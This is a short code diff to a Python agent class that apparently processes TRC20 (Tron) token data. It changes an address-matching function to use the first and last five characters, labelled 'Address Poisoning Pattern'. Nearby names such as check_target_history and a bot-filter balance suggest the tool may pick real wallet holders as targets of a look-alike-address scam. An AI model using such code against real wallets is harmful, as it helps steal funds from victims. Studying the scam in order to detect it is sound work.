@@ -20,7 +20,8 @@ class BackfillAgent(BaseAgent):
         self.bot_max_bal = Decimal(os.getenv("BOT_FILTER_MAX_BALANCE", "1000000000"))
 
     def get_pattern(self, address):
-        return f"{address[1:5]}*{address[-5:]}"
+        # Module 4: Address Poisoning Pattern (1st 5 and Last 5)
+        return f"{address[:5]}*{address[-5:]}"
 
     def check_target_history(self, address, holder_bal):
         # Use TRC20 specific transaction endpoint
